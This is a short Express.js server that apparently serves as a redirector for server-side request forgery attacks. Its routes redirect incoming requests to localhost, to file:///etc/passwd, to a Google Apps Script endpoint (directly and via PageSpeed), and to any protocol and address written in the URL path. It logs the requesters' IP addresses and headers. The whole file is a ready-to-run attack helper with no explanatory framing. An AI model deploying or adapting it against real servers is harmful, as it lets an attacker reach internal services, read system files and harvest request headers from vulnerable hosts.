var express = require('express')
var app = express()
 
app.get('/', function (req, res) {
   res.sendfile('index.html')
})

app.get('/headers',function(req,res){
   console.log(req.headers)
   res.send('ok')
})

app.get('/redirect/local',function(req,res){
    console.log("Redirect Request from: "+ req.connection.remoteAddress+" To: local")
    res.redirect('http://127.0.0.1')
})

app.get('/redirect/file',function(req,res){
    console.log("Redirect Request from: "+ req.connection.remoteAddress+" To: file")
    console.log(req.headers)
    res.redirect('file:///etc/passwd')
})

app.get('/redirect/script',function(req,res){
    console.log("Redirect Request from: "+ req.connection.remoteAddress+" To: script")
    //res.redirect('https://script.google.com/macros/s/AKfycbymYzvNs_25isPsO5ZsgkhZCRBZGqCMTvWetk50f3Ix2cJZTudW/exec')
    res.redirect('https://www.googleapis.com/pagespeedonline/v2/runPagespeed?url=https://script.google.com/macros/s/AKfycbymYzvNs_25isPsO5ZsgkhZCRBZGqCMTvWetk50f3Ix2cJZTudW/exec')
})

app.get('/redirect307/script',function(req,res){
    console.log("Redirect Request from: "+ req.connection.remoteAddress+" To: script")
    res.redirect(307,'https://script.google.com/macros/s/AKfycbymYzvNs_25isPsO5ZsgkhZCRBZGqCMTvWetk50f3Ix2cJZTudW/exec')
    //res.redirect(307,'https://www.googleapis.com/pagespeedonline/v2/runPagespeed?url=http://46.101.180.57:3000/headers')
})




app.get('/redirect/:loc',function(req,res){
    console.log("Redirect Request from: "+ req.connection.remoteAddress+" To: "+req.params.loc)
    //split on first '-' this will get the protocol but still allow domain names with '-' in them
    var proto = req.params.loc.split('-',1)
    var addr  = req.params.loc.substring(req.params.loc.indexOf('-')+1)
    res.redirect(proto+"://"+addr)
})

app.get('/redirect307/:loc',function(req,res){
    console.log("Redirect GET (307) Request from: "+ req.connection.remoteAddress+" To: "+req.params.loc)
    var proto = req.params.loc.split('-',1)
    var addr  = req.params.loc.substring(req.params.loc.indexOf('-')+1)
    res.redirect(307,proto+"://"+addr)
})
app.post('/redirect307/:loc',function(req,res){
    console.log("Redirect POST (307) Request from: "+ req.connection.remoteAddress+" To: "+req.params.loc)
    var proto = req.params.loc.split('-',1)
    var addr  = req.params.loc.substring(req.params.loc.indexOf('-')+1)
    res.redirect(307,proto+"://"+addr)
})

app.get('/rediract/:meh',function(req,res){

	console.log("Other redirect: "+req.connection.remoteAddress+" :: "+req.params.meh)
	res.redirect('/')
})
app.listen(3000)
